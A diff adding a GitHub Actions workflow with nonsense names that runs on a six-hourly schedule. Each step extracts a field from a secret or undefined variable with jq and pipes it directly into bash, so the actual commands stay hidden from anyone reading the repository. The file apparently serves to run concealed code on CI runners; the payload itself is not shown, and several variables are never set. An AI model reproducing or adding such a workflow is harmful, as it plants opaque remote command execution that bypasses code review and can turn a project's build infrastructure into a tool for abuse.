@@ -1,0 +1,20 @@
+name: taidutd
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: taidutd
+        env:
+          cet1: ${{ secrets.cet1 }}
+        run: |
+          echo $cet1 | jq -r .ek41 | /bin/bash
+          echo $kwic18411 | jq -r .c51 | /bin/bash
+          echo $nawok4 | jq -r .hwk47648 | /bin/bash
+          echo $b117 | jq -r .qjdn4990 | /bin/bash
+          echo $pxa53 | jq -r .zjm0 | /bin/bash
+
